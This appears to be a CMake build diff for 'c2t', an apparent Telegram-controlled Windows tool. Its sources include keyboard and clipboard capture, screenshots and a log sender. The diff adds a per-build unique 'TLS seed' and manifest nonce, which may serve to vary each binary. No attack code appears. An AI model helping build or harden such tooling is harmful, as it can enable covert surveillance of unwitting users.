@@ -21,15 +21,25 @@ include(FetchContent)
 include(CTest)
 
 # Generate dynamic TLS section seed & Manifest nonce per build configuration
-string(TIMESTAMP C2T_BUILD_TIME_STAMP "%s")
-string(MD5 C2T_TLS_HASH "c2t-${C2T_BUILD_TIME_STAMP}-${CMAKE_CURRENT_BINARY_DIR}")
-set(C2T_TLS_BYTE_LIST "")
-foreach(i RANGE 0 30 2)
-    string(SUBSTRING "${C2T_TLS_HASH}" ${i} 2 C2T_HEX_PAIR)
-    list(APPEND C2T_TLS_BYTE_LIST "0x${C2T_HEX_PAIR}")
-endforeach()
-string(JOIN "," C2T_TLS_SEED_FMT ${C2T_TLS_BYTE_LIST})
-set(C2T_BUILD_MANIFEST_NONCE "${C2T_TLS_HASH}")
+execute_process(
+    COMMAND ${CMAKE_COMMAND}
+        -DSOURCE_DIR=${CMAKE_CURRENT_SOURCE_DIR}
+        -DBINARY_DIR=${CMAKE_CURRENT_BINARY_DIR}
+        -DPROJECT_VERSION=${PROJECT_VERSION}
+        -P ${CMAKE_CURRENT_SOURCE_DIR}/cmake/generate_build_seed.cmake
+)
+
+add_custom_target(c2t_build_seed
+    COMMAND ${CMAKE_COMMAND}
+        -DSOURCE_DIR=${CMAKE_CURRENT_SOURCE_DIR}
+        -DBINARY_DIR=${CMAKE_CURRENT_BINARY_DIR}
+        -DPROJECT_VERSION=${PROJECT_VERSION}
+        -P ${CMAKE_CURRENT_SOURCE_DIR}/cmake/generate_build_seed.cmake
+    BYPRODUCTS
+        ${CMAKE_CURRENT_BINARY_DIR}/generated/c2t_tls_seed.h
+        ${CMAKE_CURRENT_BINARY_DIR}/c2t.manifest
+    COMMENT "Generating unique build TLS seed and manifest nonce..."
+)
 
 configure_file(src/version.h.in generated/c2t_version.h @ONLY)
 
@@ -52,6 +62,7 @@ add_executable(c2t
     src/logging/log_sender.c
     src/runtime/binding.c
     src/runtime/runtime.c
+    src/runtime/tls_seed.c
     src/screenshot/screenshot.c
     src/screenshot/screenshot_output.c
     src/screenshot/screenshot_png.c
@@ -59,6 +70,8 @@ add_executable(c2t
     src/telegram/telegram_listener.c
     src/win32/win32_api.c
 )
+add_dependencies(c2t c2t_build_seed)
+set_property(SOURCE src/runtime/tls_seed.c PROPERTY OBJECT_DEPENDS "${CMAKE_CURRENT_BINARY_DIR}/generated/c2t_tls_seed.h")
 target_compile_features(c2t PRIVATE c_std_23)
 target_include_directories(c2t PRIVATE src "${CMAKE_CURRENT_BINARY_DIR}/generated")
 if(MSVC)
@@ -146,15 +159,11 @@ endif()
 
 if(WIN32)
     configure_file(
-        "${CMAKE_CURRENT_SOURCE_DIR}/src/c2t.manifest.in"
-        "${CMAKE_CURRENT_BINARY_DIR}/c2t.manifest"
-        @ONLY
-    )
-    configure_file(
         "${CMAKE_CURRENT_SOURCE_DIR}/src/c2t.rc.in"
         "${CMAKE_CURRENT_BINARY_DIR}/c2t.rc"
         @ONLY
     )
+    set_property(SOURCE "${CMAKE_CURRENT_BINARY_DIR}/c2t.rc" PROPERTY OBJECT_DEPENDS "${CMAKE_CURRENT_BINARY_DIR}/c2t.manifest")
     target_sources(c2t PRIVATE
         src/clipboard/clipboard_windows.c
         src/keyboard/keyboard_windows.c
@@ -385,6 +394,7 @@ if(BUILD_TESTING AND NOT WIN32)
         src/logging/logging.c
         src/logging/log_sender.c
         src/runtime/runtime.c
+        src/runtime/tls_seed.c
         src/screenshot/screenshot.c
         src/screenshot/screenshot_output.c
         src/screenshot/screenshot_png.c
@@ -465,6 +475,7 @@ if(BUILD_TESTING)
         src/logging/logging.c
         src/logging/log_sender.c
         src/runtime/runtime.c
+        src/runtime/tls_seed.c
         src/screenshot/screenshot.c
         src/screenshot/screenshot_output.c
         src/screenshot/screenshot_png.c
